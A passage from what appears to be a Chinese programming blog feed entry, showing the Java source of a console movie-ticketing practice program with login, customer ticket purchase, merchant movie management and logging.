HH/mm/ss&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *7.定义一个日志对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(<span class="string">&quot;MovieSystem..class&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        showMain();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影================&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请使用内测用户登录，注册没开放&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.登录&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.用户注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.商家注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;根据输入数字选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//登录</span></span><br><span class="line">                    login();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//用户注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//商家注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入不规范，请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的昵称&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的密码&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//1.根据登录名称得查询对象</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span>CheckLoginName(loginName);</span><br><span class="line">            <span class="comment">//2.判断对象是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (u != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//3.判断密码是否正确</span></span><br><span class="line">                <span class="keyword">if</span>(u.getPassWord().equals(password))&#123;</span><br><span class="line">                    <span class="comment">//密码正确~~</span></span><br><span class="line">                    <span class="comment">//判断登录类型</span></span><br><span class="line">                    loginUser =u;</span><br><span class="line">                    LOGGER.info(u.getUserName()+<span class="string">&quot;登录了系统&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (u <span class="keyword">instanceof</span> Customer)&#123;</span><br><span class="line">                        showCustomerMain();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        showBusinessMain();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//在正常登录情况下用户在此退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;密码错误请重新输入&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;用户名错误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showBusinessMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影商家================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示详情&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.上架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.下架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.修改电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出操作&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示详情</span></span><br><span class="line">                    showBusinessINFO();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//上架</span></span><br><span class="line">                    addMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//下架</span></span><br><span class="line">                    deleteMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//修改</span></span><br><span class="line">                    updateMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    System.out.println(loginUser.getLoginName()+<span class="string">&quot;欢迎您下次到来&quot;</span>);</span><br><span class="line">                    LOGGER.info(loginUser.getUserName()+<span class="string">&quot;退出了&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修改影片信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============修改电影================&quot;</span>);</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="comment">//判断当前电影数量是否为空</span></span><br><span class="line">        <span class="keyword">if</span>(movies.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数量为空无法下架&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让商家根据名字选择要修改的电影</span></span><br><span class="line">        System.out.println(<span class="string">&quot;选择您要修改的电影&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">movieName</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span>checkMovie(movieName);</span><br><span class="line">        <span class="keyword">if</span> (movie!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后的片名：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后主演：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">actor</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后时长：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">time</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后票价：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">price</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后票数：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">totalNumber</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;请您输入修改后的放映时间&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">                    movie.setName(name);</span><br><span class="line">                    movie.setActor(actor);</span><br><span class="line">                    movie.setPrice(Double.valueOf(price));</span><br><span class="line">                    movie.setTime(Double.valueOf(time));</span><br><span class="line">                    movie.setNumber(Integer.valueOf(totalNumber));</span><br><span class="line">                    movie.setStartTime(sdf.parse(start));</span><br><span class="line">                    System.out.println(<span class="string">&quot;恭喜您成功修改了电影&quot;</span>);</span><br><span class="line">                    showBusinessINFO();</span><br><span class="line">                    LOGGER.info(loginUser.getUserName()+<span class="string">&quot;修改了《&quot;</span>+movie.getName()+<span class="string">&quot;》&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;时间解析错误&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该影片不存在&quot;</span>);</span><br><span class="line">            LOGGER.info(loginUser.getUserName()+<span class="string">&quot;修改影片失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 下架影片</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============下架电影================&quot;</span>);</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="comment">//判断当前电影数量是否为空</span></span><br><span class="line">        <span class="keyword">if</span>(movies.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数量为空无法下架&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让商家根据名字选择要下架的电影</span></span><br><span class="line">        System.out.println(<span class="string">&quot;选择您要下架的电影&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">movieName</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否存在该电影</span></span><br><span class="line">        <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span>checkMovie(movieName);</span><br><span class="line">        <span class="keyword">if</span> (movie != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;您成功删除&quot;</span>+movie.getName()+<span class="string">&quot;的信息&quot;</span>);</span><br><span class="line">            LOGGER.info(loginUser.getUserName()+<span class="string">&quot;删除了《&quot;</span>+movie.getName()+<span class="string">&quot;》的信息&quot;</span>);</span><br><span class="line">            movies.remove(movie);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *检查影片是否存在</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Movie <span class="title function_">checkMovie</span><span class="params">(String movieName)</span>&#123;</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (movie.getName().contains(movieName))&#123;</span><br><span class="line">                <span class="keyword">return</span> movie;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家上架电影</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============上架电影================&quot;</span>);</span><br><span class="line">        <span class="comment">// 根据商家对象（已经登录的用户loginUser）作为Map集合的键，其对于的值就是影片的详细信息 Map&lt;Business, List&lt;Movie&gt;&gt; ALL_MOVIES</span></span><br><span class="line">        List&lt;Movie&gt; movies = ALL_MOVIES.get(loginUser);</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入新片名：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入主演：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">actor</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入时长：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">time</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入票价：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">price</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入票数：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">totalNumber</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入影片放映时间：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">start</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="comment">//sdf.parse 可能会出现异常所以要抛出异常</span></span><br><span class="line">                <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Movie</span>(name,actor,Double.valueOf(price),Integer.valueOf(totalNumber),</span><br><span class="line">                        Double.valueOf(time),sdf.parse(start));</span><br><span class="line">                movies.add(movie);</span><br><span class="line">                System.out.println(<span class="string">&quot;您成功上架了：《&quot;</span>+movie.getName()+<span class="string">&quot;》~~&quot;</span>);</span><br><span class="line">                LOGGER.info(loginUser.getUserName()+<span class="string">&quot;上架了&quot;</span>+movie.getName());</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                LOGGER.error(<span class="string">&quot;时间解析错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示商家详细信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showBusinessINFO</span><span class="params">()</span> &#123;</span><br><span class="line">        LOGGER.info(loginUser.getUserName()+<span class="string">&quot;查看了全部电影信息&quot;</span>);</span><br><span class="line">        <span class="comment">//父类转换为子类</span></span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        System.out.println(<span class="string">&quot;店铺名称：\t\t&quot;</span>+business.getShopName()+</span><br><span class="line">                <span class="string">&quot;联系电话: \t\t&quot;</span>+business.getPhone()+<span class="string">&quot;地址：\t\t&quot;</span>+business.getAddress());</span><br><span class="line">        <span class="comment">// 根据商家对象（已经登录的用户loginUser）作为Map集合的键，其对于的值就是影片的详细信息 Map&lt;Business, List&lt;Movie&gt;&gt; ALL_MOVIES</span></span><br><span class="line">        List&lt;Movie&gt; movies = ALL_MOVIES.get(loginUser);</span><br><span class="line">        <span class="keyword">if</span> (movies.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;片面\t\t\t主演\t\t时长\t\t评分\t\t票价\t\t余票\t\t放映时间\t\t&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">                System.out.println(movie.getName()+<span class="string">&quot;\t\t\t&quot;</span>+movie.getActor()+<span class="string">&quot;\t\t&quot;</span>+movie.getTime()+<span class="string">&quot;\t\t&quot;</span>+movie.getScore()</span><br><span class="line">                +<span class="string">&quot;\t\t&quot;</span>+movie.getPrice()+<span class="string">&quot;\t\t&quot;</span>+movie.getNumber()+<span class="string">&quot;\t\t&quot;</span>+sdf.format(movie.getStartTime()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前影片为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showCustomerMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影用户================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示全部影片信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.根据电影名称查询信息(没开放)&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.评分系统(未开放)&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.购票系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示全部排片信息</span></span><br><span class="line">                    showAllMovies();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//查询</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//评分</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//购票</span></span><br><span class="line">                    buyMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户购票功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buyMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        showAllMovies();</span><br><span class="line">        System.out.println(<span class="string">&quot;=============用户购票功能=================&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请选择要购买的门店&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">shopName</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">        <span class="comment">//判断商家是否存在</span></span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> checkShop(shopName);</span><br><span class="line">        <span class="keyword">if</span> (business == <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起门店不存在&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//展示商家已有的影片</span></span><br><span class="line">            List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">            <span class="keyword">if</span> (movies.size()&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入要购买的电影名称：&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">movieName</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">                <span class="comment">//去当前商家查询电影信息</span></span><br><span class="line">                <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span>getShopMovie(business,movieName);</span><br><span class="line">                <span class="keyword">if</span> (movie != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">//开始购买</span></span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;请选择您要购买的票数&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">number</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">                        <span class="type">int</span> <span class="variable">buyNumber</span> <span class="operator">=</span> Integer.valueOf(number);</span><br><span class="line">                        <span class="comment">//判断电影是否能买票</span></span><br><span class="line">                        <span class="keyword">if</span>(movie.getNumber() &gt; buyNumber)&#123;</span><br><span class="line">                            <span class="comment">//可以成功买票</span></span><br><span class="line">                            <span class="type">double</span> <span class="variable">money</span> <span class="operator">=</span> BigDecimal.valueOf(buyNumber).</span><br><span class="line">                                    multiply(BigDecimal.valueOf(movie.getPrice())).doubleValue();</span><br><span class="line">                            <span class="keyword">if</span> (loginUser.getMoney() &gt; money)&#123;</span><br><span class="line">                                <span class="comment">//钱够买票</span></span><br><span class="line">                                System.out.println(<span class="string">&quot;您成功购买了&quot;</span>+movie.getName()+buyNumber+<span class="string">&quot;票，总金额是&quot;</span>+money);</span><br><span class="line">                                <span class="comment">//更新数据</span></span><br><span class="line">                                loginUser.setMoney(loginUser.getMoney()- money);</span><br><span class="line">                                business.setMoney(business.getMoney()+money);</span><br><span class="line">                                movie.setNumber(movie.getNumber()- buyNumber);</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;钱不够买票&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;当前票数不够&quot;</span>);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Movie <span class="title function_">getShopMovie</span><span class="params">(Business business,String name)</span>&#123;</span><br><span class="line">        List&lt;Movie&gt; movies = ALL_MOVIES.get(business);</span><br><span class="line">        <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">            <span class="keyword">if</span>(movie.getName().contains(name))&#123;</span><br><span class="line">                <span class="keyword">return</span> movie;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Business <span class="title function_">checkShop</span><span class="params">(String shopName)</span>&#123;</span><br><span class="line">        Set&lt;Business&gt; businesses =ALL_MOVIES.keySet();</span><br><span class="line">        <span class="keyword">for</span> (Business business : businesses) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((business.getShopName().equals(shopName)))&#123;</span><br><span class="line">                <span class="keyword">return</span> business;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showAllMovies</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============展示所有电影信息============&quot;</span>);</span><br><span class="line">        ALL_MOVIES.forEach((business, movies) -&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;店铺名称：\t\t&quot;</span>+business.getShopName()+</span><br><span class="line">                    <span class="string">&quot;联系电话: \t\t&quot;</span>+business.getPhone()+<span class="string">&quot;地址：\t\t&quot;</span>+business.getAddress());</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t片面\t\t\t主演\t\t时长\t\t评分\t\t票价\t\t余票\t\t放映时间\t\t&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t\t&quot;</span>+movie.getName()+<span class="string">&quot;\t\t\t&quot;</span>+movie.getActor()+<span class="string">&quot;\t\t&quot;</span>+movie.getTime()+<span class="string">&quot;\t\t&quot;</span>+movie.getScore()</span><br><span class="line">                        +<span class="string">&quot;\t\t&quot;</span>+movie.getPrice()+<span class="string">&quot;\t\t&quot;</span>+movie.getNumber()+<span class="string">&quot;\t\t&quot;</span>+sdf.format(movie.getStartTime()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginName 用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  User <span class="title function_">CheckLoginName</span><span class="params">(String loginName)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (User User : ALL_USERS) &#123;</span><br><span class="line">            <span class="comment">//通过遍历判断是否存在这个用户名</span></span><br><span class="line">            <span class="keyword">if</span>(User.getLoginName().equals(loginName))&#123;</span><br><span class="line">                <span class="keyword">return</span> User;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录今天关于JavaSE基础部分的练习，涉及到面向对象，继承，Static，List，Map，日志等方面的内容&lt;/p&gt;
